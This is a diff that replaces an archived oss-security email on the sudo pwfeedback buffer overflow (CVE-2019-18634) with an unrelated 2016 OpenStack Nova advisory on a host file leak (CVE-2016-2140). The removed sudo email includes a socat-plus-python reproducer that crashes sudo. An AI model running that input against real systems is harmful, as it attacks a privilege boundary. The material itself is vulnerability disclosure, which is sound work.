@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1405" "Wednesday" "5" "February" "2020" "22:34:53" "+1100" "William Bowling" "will@wbowling.info" nil "50" nil "^Date:" nil nil "2" nil nil (number mark "        will@wbowlin Feb  5   50/1405  " thread-indent "\"Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2285" "Tuesday" "8" "March" "2016" "20:16:39" "+0000" "Tristan Cacqueray" "tdecacqu@redhat.com" "<56DF3327.9000704@redhat.com>" "77" "[oss-security] [OSSA 2016-007] Nova host data leak through resize/migration (CVE-2016-2140)" nil nil nil "3" "2016030820:16:39" "[oss-security] [OSSA 2016-007] Nova host data leak through resize/migration (CVE-2016-2140)" (number mark "U       tdecacqu@red Mar  8   77/2285  " thread-indent "\"[oss-security] [OSSA 2016-007] Nova host data leak through resize/migration (CVE-2016-2140)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 25660 invoked by uid 550); 5 Feb 2020 12:19:16 -0000
+Received: (qmail 28089 invoked by uid 550); 8 Mar 2016 20:16:16 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,92 +11,97 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 10026 invoked from network); 5 Feb 2020 11:35:15 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=wbowling.info; s=google;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
-        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
-        b=MQyrU6Yf5PZzzfxE/aFl/VPbjV79Vjh2T3r7fRRHKXhufM82gGrh+pwrUojPKeWtP5
-         7D+VWWS0cNrrSHMAFk7MchpgtV0WSfsxVXUuFedU/pnC19fZBpoWkaMsQd9f0gCAkURB
-         pwskmuWVdDMNIr71/AnejSZnO1AdFYi8o8IcYpCKqq9qZJhbVIj07qx2zZpcf5BJyMFg
-         TRoVvIoGfGK+L3C6UvOhQL8k7JjaLsNj4+dXAzvGZjdAWAOBlo2r49t9u8XTjwPoVp3/
-         Mu0YIhHUl3Gs1SrVLc1h5Rke1AZVqK2KtfgQ5LGAR81mAYaIyKFTJo2Em6EjbmmKLnrd
-         fwXQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to;
-        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
-        b=JWuRV391Q6Y4zQrfPI0n4SvGSqyvSvLOB51LoEBoGZVmcw82Q47wnBBmMq+umbTebL
-         sE8rtyiw0tgTkiZqa6nKk+ux1eUGa+l3D7AyqrvGXmkgzPQEltwoDyFWCY4TccgEWaB9
-         PoXyBq5wd81/6d/c+VtvHhoqLaTeCm40y4onQU0sB+SkrmX3rzbwN+a61HqvpO2DDJGn
-         QFUZl+Ot7hqEOUagtA+acgOSupQ4UeFOL8iDET3vR9ObWfcnSUMZi+MzG4rHA5h/s385
-         fyXsAyxKkrLINBnZZpPSA1pXkBXIIM6i3Xfbm+IqfOiUJ2cb/wMQ6A2f6tBLYkWssOR6
-         ElDA==
-X-Gm-Message-State: APjAAAUJOUQ1AiSKrz733LZKUC4y23kUeH5T0yx7bifyIiSXDSHm1fsJ
-	1XCB3tvBMiLM3/B7MX9SG6ntI6X4iHtIcFNX+8gBAGCkqMI=
-X-Google-Smtp-Source: APXvYqzW6TfCvt4kRE4FQbbrV7tFmzQGsvZIVqN1egK6KhVA9ZB3k48oowybHW6pxx+NR7HEkW36Gq/CJbyHwjmfM7k=
-X-Received: by 2002:a5d:6703:: with SMTP id o3mr26831328wru.235.1580902504020;
- Wed, 05 Feb 2020 03:35:04 -0800 (PST)
+Received: (qmail 28067 invoked from network); 8 Mar 2016 20:16:15 -0000
+X-Enigmail-Draft-Status: N1110
+Message-ID: <56DF3327.9000704@redhat.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
+ Thunderbird/38.5.0
 MIME-Version: 1.0
-References: <aff313846ed736fa@sudo.ws>
-In-Reply-To: <aff313846ed736fa@sudo.ws>
-Message-ID: <CAPWJUny2yaenu_Kg7s4VhuL0nZ4Yg4XPN9HN75e5w0MU4brTnw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary="0000000000002d5094059dd28c59"
-Date: Wed, 5 Feb 2020 22:34:53 +1100
-From: William Bowling <will@wbowling.info>
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="nGOvaOM0o72alcs8TvDwKEFMQqV7BL8AM"
+X-Scanned-By: MIMEDefang 2.68 on 10.5.11.27
+Date: Tue, 8 Mar 2016 20:16:39 +0000
+From: Tristan Cacqueray <tdecacqu@redhat.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when
- pwfeedback is enabled
+Subject: [oss-security] [OSSA 2016-007] Nova host data leak through resize/migration
+ (CVE-2016-2140)
 To: oss-security@lists.openwall.com
 
---0000000000002d5094059dd28c59
-Content-Type: text/plain; charset="UTF-8"
+--nGOvaOM0o72alcs8TvDwKEFMQqV7BL8AM
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-When using a pty, sudo_term_eof and sudo_term_kill are initialized to 0x4
-and 0x15 allowing the overflow to be reached, making 1.8.26-1.8.30 also
-vulnerable:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D
+OSSA-2016-007: Nova host data leak through resize/migration
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-$ socat pty,link=/tmp/pty,waitslave exec:"python -c
-'print((\"A\"*100+chr(0x15))*50)'" &
-$ sudo -S id < /tmp/pty
-[sudo] password for user1: Segmentation fault
-$ sudo -V
-Sudo version 1.8.30
-Sudoers policy plugin version 1.8.30
-Sudoers file grammar version 46
-Sudoers I/O plugin version 1.8.30
-
-- Will
-
-On Sat, Feb 1, 2020 at 12:59 AM Todd C. Miller <Todd.Miller@sudo.ws> wrote:
-
-> On Thu, 30 Jan 2020 11:23:28 -0700, "Todd C. Miller" wrote:
->
-> > Sudo versions affected:
-> >
-> > Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if
-> > the "pwfeedback" option is enabled in sudoers.
->
-> It turns out a change in EOF handling introduced in sudo 1.8.26
-> prevents exploitation of the bug.  The EOF character is also
-> initialized to 0 and sudo 1.8.26 checks for EOF before it checks
-> for the kill character.
->
-> This means that the bug actually affects sudo versions 1.7.1 to
-> 1.8.25p1 inclusive.
->
-> Sorry for the oversight.  I've updated the affected versions in
-> https://www.sudo.ws/alerts/pwfeedback.html
->
->  - todd
->
+:Date: March 08, 2016
+:CVE: CVE-2016-2140
 
 
--- 
+Affects
+~~~~~~~
+- Nova: <=3D2015.1.3, >=3D12.0.0 <=3D12.0.2
 
-GPG Key ID: 0x980F711A
 
-GPG Key Fingerprint: AA38 2A0E 7D22 18A9 6086  0289 41DC E04B 980F 711A
+Description
+~~~~~~~~~~~
+Matthew Booth from Red Hat reported a vulnerability in Nova instance
+resize/migration. By overwriting an ephemeral or root disk with a
+malicious image before requesting a resize, an authenticated user may
+be able to read arbitrary files from the compute host. Only setups
+using libvirt driver with raw storage and setting "use_cow_images =3D
+False" (not default) are affected.
 
---0000000000002d5094059dd28c59--
+
+Patches
+~~~~~~~
+- https://review.openstack.org/289960 (Kilo)
+- https://review.openstack.org/289958 (Liberty)
+- https://review.openstack.org/289957 (Mitaka)
+
+
+Credits
+~~~~~~~
+- Matthew Booth from Red Hat (CVE-2016-2140)
+
+
+References
+~~~~~~~~~~
+- https://bugs.launchpad.net/bugs/1548450
+- http://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2016-2140
+
+
+Notes
+~~~~~
+- This fix will be included in future 2015.1.3 (kilo) and 12.0.3
+  (liberty) releases.
+
+--
+Tristan Cacqueray
+OpenStack Vulnerability Management Team
+
+
+--nGOvaOM0o72alcs8TvDwKEFMQqV7BL8AM
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQEcBAEBCAAGBQJW3zMnAAoJECK5oFySXMXYdHkH/jNC5/vHWBqrt2+lxFNAcAms
+KRmkkbDrfFt8OzD9EX/2xxbuyGULTLGYLYPc87L+vUygG0PG0a2qH6WyNEoS9fA6
+qddMDq7FluqK8qrivedSMG0r5F3zV6Z8pRBg5S+2AGaqTHoyJaDHzBvdFFVJfqNx
+oXFuE5sy7a56s8rezLoiuAWTBfuKjj29adflgN65vyfLJXDU6h7xigkMAjY2T3WV
+cwu9Ho0pjtHROmQft/wck3Sm5Zu82umeRALguwsWZq2beVJsK75smBdBx1G+M+kz
+hGDLDpmTWPZ9+A1KW2EfnvJCH+1beT7DzPfP8OAtXadHcQjM/Z2vt+UHYFwMlvw=
+=gLfD
+-----END PGP SIGNATURE-----
+
+--nGOvaOM0o72alcs8TvDwKEFMQqV7BL8AM--
